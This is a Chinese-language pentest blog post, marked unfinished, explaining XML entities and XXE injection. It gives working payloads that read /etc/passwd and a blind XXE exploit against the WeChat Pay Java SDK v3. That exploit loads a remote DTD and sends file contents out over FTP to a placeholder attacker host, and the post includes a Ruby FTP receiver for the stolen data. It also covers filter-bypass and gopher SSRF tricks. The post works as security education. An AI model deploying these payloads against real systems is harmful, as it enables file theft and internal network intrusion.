Title: XXE(未完)
Category: Pentest
Date: 2018-2-2
Slug: xxe

XML基础：

XML文档结构：

```
XML声明
<?xml version="1.0"?>

DTD文档类型定义
<!DOCTYPE note [  <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)>  <!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)>     <!--定义to元素为”#PCDATA”类型-->
<!ELEMENT from (#PCDATA)>   <!--定义from元素为”#PCDATA”类型-->
<!ELEMENT head (#PCDATA)>   <!--定义head元素为”#PCDATA”类型-->
<!ELEMENT body (#PCDATA)>   <!--定义body元素为”#PCDATA”类型-->
]]]


文档元素
<note>
<to>Dave</to>
<from>Tom</from>
<head>Reminder</head>
<body>You are a good man</body>
</note>

```

DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。

```
内部声明DTD：

<!DOCTYPE 跟元素 [元素声明］>

引用外部DTD:

<!DOCTYPE 根元素  SYSTEM "文件名">
```

DTD文档中很多关键字如下: 

* DOCTYPE(DTD的声明）
* ENTITY （实体的声明）
* SYSTEM、PUBLIC （外部资源申请） 

###实体

实体可以理解为变量，必须在DTD定义声明，可以在文档中的其它位置引用该变量的值。
实体按类型主要分以下四种:

* 内置实体（Built-in entities)
* 字符实体（Character entities)
* 通用实体（General entities）
* 参数实体 (Parameter entities）

实体根据引用方式，可以分为内部实体和外部实体。例子：

```
内部实体：
<!ENTITY entity_name "entity_value">

entity_name is the name of entity followed by its value within the double quotes or single quote.

entity_value holds the value for the entity name

外部实体：
<!ENTITY name SYSTEM "URI/URL">

name is the name of entity.
SYSTEM is the keyword.
URI/URL is the address of the external source enclosed within the double or single quotes.

外部实体声明的时候可以有两种：SYSTEM和PUBLIC

<!DOCTYPE name SYSTEM "address.dtd" [...]>
<!DOCTYPE name PUBLIC "-//Beginning XML//DTD Address Example//EN">
```

###参数实体

参数实体（Parameter entities）语法这样：

```
<!ENTITY % ename "entity_value">

entity_value is any character that is not an '&', '%' or ' " '.
```
是用%实体名称声明，引用的时候也是％实体名称，其它实体（内置实体，字符实体，通用实体）直接用实体名声声明，引用的时候用&。

参数实体只能在DTD中声明，DTD中引用，其它实体只能在DTD中声明，可以在xml文档中引用。

###内部实体

```
<!ENTITY 实体名称 "实体的值">
```
###外部实体

```
<!ENTITY 实体名称 SYSTEM "URI">
```

###参数实体

```
<!ENTITY % 实体名称 "实体的值">
<!ENTITY % 实体名称 SYSTEM "URI">
```

###参数实体+外部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY % name SYSTEM "file:///etc/passwd">
    %name;
]>
注意：%name（参数实体）是在DTD中被引用的，而&name（其余实体）是在xml文档中被引用的。

<?xml version="1.0"?>

<!DOCTYPE foo [

<!ELEMENT methodName ANY >

<!ENTITY zozhang SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd" >]>

<methodCall>

<methodName>&zozhang;</methodName>

</methodCall>
```
由于XXE漏洞主要引用了DTD的外部实体导致的漏洞，重点看下能引用哪些类型的外部实体，外部实体

```
<!ENTITY 实体名称 SYSTEM "URI">
```

语法引用外部实体，而非内部实体，所以URL中能写类型如下：


![](https://thief.one/upload_image/20170620/1.png)



XXE漏洞（XML External Entity Injection)即xml外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，没有禁用外部实体的加载，导致可以加载恶意外部文件，造成文件读取，命令执行，内网扫描等危害。xxe的触发点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可以上传恶意xml文件。


<https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet>
>Note: Per: https://mail.gnome.org/archives/xml/2012-October/msg00045.html, starting with libxml2 version 2.9, XXE has been disabled by default as committed by the following patch: http://git.gnome.org/browse/libxml2/commit/?id=4629ee02ac649c27f9c0cf98ba017c6b5526070f. 

所以：从libxml2.91版本开始，默认不解析外部实体。







<http://wooyun.jozxing.cc/static/bugs/wooyun-2014-059783.html> 百度修复xxe漏洞外部实体的绕过


2018.7.4号更新:

wxpay的java SDK_v3版本出现xxe漏洞，EXP如下:

##0x01 解法

```
Request的Body:

<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://x.x.x.x:8000/data.xml">%remote;]><root/>


data.xml:

<!ENTITY % attack SYSTEM "file:///home/">
<!ENTITY % shell "<!ENTITY &#37; upload SYSTEM 'ftp://x.x.x.x:33/%attack;
'>">

```

另外需要服务器开一个ftp:

```ruby
ftp.rb

require 'socket'
server = TCPServer.new 33 
loop do
  Thread.start(server.accept) do |client|
    puts "New client connected"
    data = ""
    client.puts("220 xxe-ftp-server")
    loop {
        req = client.gets()
        puts "< "+req
        if req.include? "USER"
            client.puts("331 password please - version check")
        else
           #puts "> 230 more data please!"
            client.puts("230 more data please!")
        end
    }
  end
end
```

##0x02 解法

body:

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///home/">
<!ENTITY % dtd SYSTEM "http://x.x.x.x:8000/data.xml">
%dtd; %all;
]>
<value>&send;</value>
```

服务器的xml:

```
<!ENTITY % all "<!ENTITY  send SYSTEM 'ftp://x.x.x.x:33/%attack;
'>">
```

一个是参数实体，一个是其他实体。在服务区开启`ruby ftp.rb`监听33端口，就可以等待数据过来了。因为这次的xxe属于blind xxe，在java里面只能使用ftp+file来读取文件。<https://joychou.org/java/java-xxe-vulnerability.html> 具体情况可以看这个文章。

这种没有回显的情况下，使用`ftp + file`读取文件，`http`来探测内网开启的端口


##注意点:

###绕过:

如果存在防火墙可以使用编码绕过关键词:<https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf>，比如UTF-7

###Gopher:


查了几个资料，虽然写的在java环境里面可以使用gopher来传递数据，但是在<https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0>里面7u9和6u35版本修复了。本来到这里问题就没有了，但是，TM 7u9是啥版本啊？我测试了几个平台，在xxe外带到我的服务器的时候，版本号是这样:
`Java/1.7.0_72`, `Java/1.7.0_79`，这两个可以查询到文件内容，但是使用gopher协议就出不来东西。(对了，`Java/1.8.0_121`版本使用上面的EXP没有数据出来，暂未可知）

gopher协议就是把上面的ftp修改为gopher，然后nc直接监听即可。可以在<https://blog.h3xstream.com/2014/06/identifying-xml-external-entity.html>这个文章看到具体操作。

上面也就是说在7u9和6u35版本之前是可以使用gopher协议的，如果可以使用gopher协议，第一个可以外带发送数据，第二个是ssrf的效果，比如攻击redis之类的。

`Java/1.7.0_72`这个版本对应的是`7u72`，所以推测`7u9`版本是`Java/1.7.0_09`，在这个1.7版本之前可以使用gopher来进一步的攻击。

如果不晓得是怎么过程，看这里:<https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf>


参考链接:

* <https://joychou.org/java/java-xxe-vulnerability.html>
* <http://blog.leanote.com/post/xuxi/XXE%E6%80%BB%E7%BB%93>
* <https://zh.wikipedia.org/wiki/Java%E7%89%88%E6%9C%AC%E6%AD%B7%E5%8F%B2#Java_7_%E6%9B%B4%E6%96%B0>